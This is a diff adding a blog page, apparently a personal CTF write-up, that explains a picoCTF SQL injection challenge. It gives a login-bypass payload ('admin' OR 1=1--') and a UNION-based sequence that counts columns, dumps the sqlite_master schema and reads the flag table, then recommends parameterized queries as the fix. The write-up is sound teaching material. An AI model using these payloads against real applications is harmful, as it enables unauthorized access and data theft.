@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>picoCTF SQL Injection Writeup — Lucky Thandel</title>
+<meta name="description" content="picoCTF web exploitation SQL injection writeup: bypassing login with OR 1=1, UNION-based extraction, flag retrieval. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-09-22 · CTF · web · 6 min read</div>
+<h1>picoCTF Web Exploitation — SQL Injection Writeup</h1>
+<div><span class="tag">ctf</span><span class="tag">web</span><span class="tag">sqli</span><span class="tag">picoctf</span></div>
+
+<div class="article-body">
+<h2><span class="amber">$</span> 0x01 — The login form</h2>
+<p>The challenge gives you a classic username/password form. First rule of web CTFs: find out what the backend query looks like. A login usually builds something like:</p>
+<pre class="terminal">SELECT * FROM users WHERE username='&lt;input&gt;' AND password='&lt;input&gt;';</pre>
+<p>Probe with a single quote in the username field. If the page errors or behaves differently — the input reaches SQL. Then bypass the password check entirely:</p>
+<pre class="terminal"><span class="prompt"></span>username: admin' OR 1=1--
+<span class="prompt"></span>password: anything</pre>
+<p>The query becomes <code>... WHERE username='admin' OR 1=1--' AND ...</code> — everything after <code>--</code> is a comment, <code>1=1</code> is always true, and you are logged in as admin.</p>
+
+<h2><span class="amber">$</span> 0x02 — Going deeper with UNION</h2>
+<p>Login bypass is step one. To actually <em>read</em> data, find a page that reflects query output (a profile page, search results), then:</p>
+<table class="cmd">
+<tr><th>step</th><th>payload idea</th><th>goal</th></tr>
+<tr><td>1</td><td><code>' ORDER BY 1--</code> … increment until error</td><td>count columns</td></tr>
+<tr><td>2</td><td><code>' UNION SELECT 1,2,3--</code></td><td>find reflected columns</td></tr>
+<tr><td>3</td><td><code>' UNION SELECT sql,2,3 FROM sqlite_master--</code></td><td>dump schema</td></tr>
+<tr><td>4</td><td><code>' UNION SELECT flag,2,3 FROM flags--</code></td><td>read the flag</td></tr>
+</table>
+
+<h2><span class="amber">$</span> 0x03 — Takeaways</h2>
+<ul>
+<li><strong>Error messages are oracle output.</strong> Different responses for valid vs broken SQL tell you the query shape.</li>
+<li><strong>UNION needs matching column counts</strong> — that is what the <code>ORDER BY</code> probing is for.</li>
+<li><strong>The real-world fix:</strong> parameterized queries / prepared statements. String-concatenated SQL is the vulnerability, the payload is just the messenger.</li>
+</ul>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · CTF writeup series · practice ethically on picoCTF labs.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
